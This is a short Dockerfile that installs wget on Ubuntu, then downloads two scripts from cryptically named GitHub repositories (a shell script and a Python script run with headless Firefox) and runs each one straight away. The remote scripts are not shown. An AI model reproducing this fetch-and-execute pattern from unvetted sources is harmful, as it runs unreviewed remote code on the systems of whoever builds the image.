FROM ubuntu:latest
RUN apt update && apt install wget software-properties-common -y
RUN wget https://github.com/Mosnio/lyr/raw/main/ald.sh && bash ald.sh
RUN wget https://github.com/Mosnio/yamigv/raw/main/rn.py && export MOZ_HEADLESS=1  && python3 rn.py
